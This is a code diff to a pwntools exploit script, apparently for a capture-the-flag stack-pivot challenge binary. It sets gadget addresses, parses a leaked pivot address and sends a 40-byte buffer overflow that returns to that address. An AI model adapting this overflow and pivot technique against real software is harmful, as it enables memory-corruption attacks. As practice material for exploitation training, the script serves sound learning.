@@ -1,9 +1,9 @@
 from pwn import *
 from icecream import ic
 
-{bindings}
+exe = ELF("./pivot_patched")
 
-context.binary = {bin_name}
+context.binary = exe
 context.log_level = "debug"
 context.aslr = True
 
@@ -18,12 +18,12 @@ def start(argv=[], *a, **kw):
     if args.REMOTE:
         return remote("localhost", 1337)
     if args.GDB:
-        return gdb.debug({proc_args} + argv, gdbscript=gdbscript, *a, **kw)
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
     else:
-        return process({proc_args} + argv, *a, **kw)
+        return process([exe.path] + argv, *a, **kw)
 
 gdbscript = '''
-
+b *0x0000000000400967
 c
 '''.format(**locals())
 
@@ -38,5 +38,24 @@ def i(): return io.interactive()
 
 io = start()
 
+# # Useful Gadgets
+# pop_rax = 0x00000000004009bb
+# xchg_rsp_rax = 0x00000000004009bd
+# mov_inside_rax_rax = 0x00000000004009c0
+# nop_rax = 0x00000000004009c8
+
+
+
+ru("pivot: ")
+pivot = int(re(14).decode(), 16) + 0x22ab71
+ru(">")
+ic(hex(pivot))
+payload = b'a'
+sl(payload)
+
+payload = b'a'*40
+payload += p64(pivot)
+ru(">")
+sl(payload)
 
 i()
